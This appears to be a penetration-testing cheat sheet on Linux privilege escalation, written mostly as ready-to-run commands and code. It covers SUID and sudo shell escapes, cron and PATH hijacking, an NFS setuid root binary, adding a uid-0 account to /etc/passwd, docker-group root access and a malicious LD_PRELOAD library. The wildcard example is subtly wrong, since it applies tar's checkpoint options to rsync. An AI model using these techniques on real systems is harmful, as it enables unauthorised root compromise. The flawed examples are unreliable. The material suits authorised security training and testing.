# 🐧 Linux Privilege Escalation

Privilege Escalation refers to the process of exploiting misconfigurations, known vulnerabilities and unintended bugs in order to gain higher privileges on the target host. The final objective of this process is to gain the highest level of privileges on a target machine, achieving full compromise of that target.

## External Resources

**Linux Privilege Escalation:**
- [g0tm1lk's Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [HackTricks - Linux Privilege Escalation Checklist](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist)
- [GTFOBins](https://gtfobins.github.io/) - Unix binaries that can be exploited

## Techniques Covered

- [Enumeration](enumeration.md) - System reconnaissance to identify potential attack vectors
- [Programs, Jobs and Services](programs-jobs-and-services.md) - Exploiting misconfigured services, cron jobs, and SUID binaries
- [Environment Variables Abuse](environment-variables-abuse.md) - PATH variable, LD_PRELOAD and other issues
- [Persistence](persistence.md) - Maintaining access after gaining elevated privileges

## Table of Contents

- [Enumeration Scripts](#enumeration-scripts)
- [Kernel Exploits](#kernel-exploits)
- [SUID/SGID Binaries](#suidsgid-binaries)
- [Sudo Rights](#sudo-rights)
- [Cron Jobs](#cron-jobs)
- [Path Variable Manipulation](#path-variable-manipulation)
- [NFS Shares](#nfs-shares)
- [Weak File Permissions](#weak-file-permissions)
- [Service Exploits](#service-exploits)
- [Docker Group](#docker-group)
- [Capabilities](#capabilities)
- [LD_PRELOAD and LD_LIBRARY_PATH](#ld_preload-and-ld_library_path)

## Enumeration Scripts

Before trying specific techniques, it's advisable to run automated enumeration scripts to identify potential privilege escalation vectors:

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum
```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### LSE (Linux Smart Enumeration)
```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
chmod +x lse.sh
./lse.sh
```

### pspy (Process Spy)
```bash
# 64-bit
curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64 -o pspy64
chmod +x pspy64
./pspy64

# 32-bit
curl -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32 -o pspy32
chmod +x pspy32
./pspy32
```

## Kernel Exploits

Identifying and exploiting kernel vulnerabilities:

1. Check kernel version:
```bash
uname -a
cat /proc/version
```

2. Search for known exploits:
```bash
searchsploit linux kernel [version]
```

3. Common kernel exploits:
   - Dirty COW (CVE-2016-5195)
   - overlayfs (CVE-2021-3493)
   - PTRACE_TRACEME (CVE-2019-13272)

Example: Exploiting Dirty COW
```bash
# Check if vulnerable
grep -q "Ubuntu 16.04" /etc/issue && echo "System might be vulnerable to Dirty COW"

# Download and compile exploit
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123
```

## SUID/SGID Binaries

SUID (Set User ID) and SGID (Set Group ID) binaries run with the privileges of the file owner/group:

1. Find SUID/SGID binaries:
```bash
# Find SUID binaries
find / -type f -perm -4000 -ls 2>/dev/null

# Find SGID binaries
find / -type f -perm -2000 -ls 2>/dev/null
```

2. Investigate each binary using GTFOBins (https://gtfobins.github.io/) to identify potential privilege escalation vectors.

Example exploits:

Using `find` for privilege escalation:
```bash
find . -exec /bin/sh -p \; -quit
```

Using `nano` for privilege escalation:
```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

Using `cp` to overwrite sensitive files:
```bash
cp /tmp/malicious_passwd /etc/passwd
```

## Sudo Rights

Check what commands you can run with sudo:

```bash
sudo -l
```

Common sudo privilege escalation vectors:

1. Running commands with sudo:
```bash
# If you can run any command as sudo
sudo -i

# If you can run vim as sudo
sudo vim -c '!sh'

# If you can run find as sudo
sudo find . -exec /bin/sh \; -quit

# If you can run python as sudo
sudo python -c 'import os; os.system("/bin/sh")'
```

2. Environment variables preservation with sudo (`env_keep`):
```bash
# If LD_PRELOAD is kept
sudo LD_PRELOAD=/path/to/malicious.so program
```

3. Wildcard exploitation:
```bash
# If you can run something like: sudo /usr/bin/rsync *.conf /backup/
echo 'command' > exploit.conf
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
sudo /usr/bin/rsync *.conf /backup/
```

## Cron Jobs

Identifying and exploiting vulnerable cron jobs:

1. Find cron jobs:
```bash
crontab -l
ls -la /etc/cron*
cat /etc/crontab
```

2. Look for writable scripts executed by cron:
```bash
find /etc/cron* -type f -writable
```

3. Monitor running processes to identify cron jobs:
```bash
./pspy64
```

Example exploitation:
```bash
# If you find a writable script run by root cron job
echo 'chmod +s /bin/bash' >> /path/to/writable/script.sh
# Wait for cron to execute
/bin/bash -p
```

## Path Variable Manipulation

If the system uses a relative path to execute commands and the PATH variable can be manipulated:

1. Check the current PATH:
```bash
echo $PATH
```

2. Create a malicious binary with the same name:
```bash
cd /tmp
echo '#!/bin/bash' > service
echo 'chmod +s /bin/bash' >> service
chmod +x service
```

3. Modify the PATH to include your directory:
```bash
export PATH=/tmp:$PATH
```

4. Wait for the vulnerable script to be executed, or execute it if you have permission.

## NFS Shares

Exploiting misconfigured NFS shares:

1. Check for NFS shares:
```bash
# On the target
cat /etc/exports
showmount -e localhost

# From an attacker machine
showmount -e target_ip
```

2. Look for shares with `no_root_squash` or `no_all_squash` options.

3. Mount the share and exploit:
```bash
# On the attacker machine
mkdir /tmp/nfs
mount -t nfs target_ip:/shared/folder /tmp/nfs
cd /tmp/nfs
echo 'int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }' > privesc.c
gcc privesc.c -o privesc
chmod +s privesc
# On the target
/shared/folder/privesc
```

## Weak File Permissions

Check for writable sensitive files:

1. System configuration files:
```bash
find /etc -writable -type f 2>/dev/null
```

2. /etc/passwd writable (rare but worth checking):
```bash
ls -la /etc/passwd

# If writable, add a new root user
echo 'malicious:x:0:0::/root:/bin/bash' >> /etc/passwd
echo 'malicious::0:0::/root:/bin/bash' >> /etc/passwd
echo 'malicious:$1$xyz$SomeHashedPasswordHere:0:0::/root:/bin/bash' >> /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz password123
```

3. Service configuration files:
```bash
find /etc/service/ -writable 2>/dev/null
```

## Service Exploits

Exploit misconfigured services:

1. Check for running services:
```bash
ps aux
netstat -tuln
```

2. Look for services running as root with writable configuration or binary files:
```bash
find / -writable -name "*.service" 2>/dev/null
find / -writable -path "/etc/systemd/system/*" 2>/dev/null
```

3. Check for writable service binaries:
```bash
for SRV in $(systemctl list-unit-files --type=service | grep enabled | awk '{print $1}'); do
  EXEC=$(systemctl show -p ExecStart $SRV | cut -d '=' -f 2)
  ls -la $EXEC 2>/dev/null | grep -v ' root root '
done
```

## Docker Group

If the user is part of the docker group:

```bash
id
# Check if user is in docker group

# Mount root filesystem and gain root
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

## Capabilities

Check for binaries with dangerous capabilities:

```bash
getcap -r / 2>/dev/null
```

Example exploitation of capabilities:

```bash
# If python has cap_setuid capability
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## LD_PRELOAD and LD_LIBRARY_PATH

If you can control LD_PRELOAD or LD_LIBRARY_PATH when running a SUID binary:

1. Create a malicious shared library:
```bash
cat << EOF > /tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    exit(0);
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
```

2. Use LD_PRELOAD to load the malicious library:
```bash
sudo LD_PRELOAD=/tmp/evil.so program
```

3. Alternatively, use LD_LIBRARY_PATH to point to a directory with malicious libraries:
```bash
LD_LIBRARY_PATH=/tmp program
```

## Resources

- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings - Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [g0tmi1k's Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) 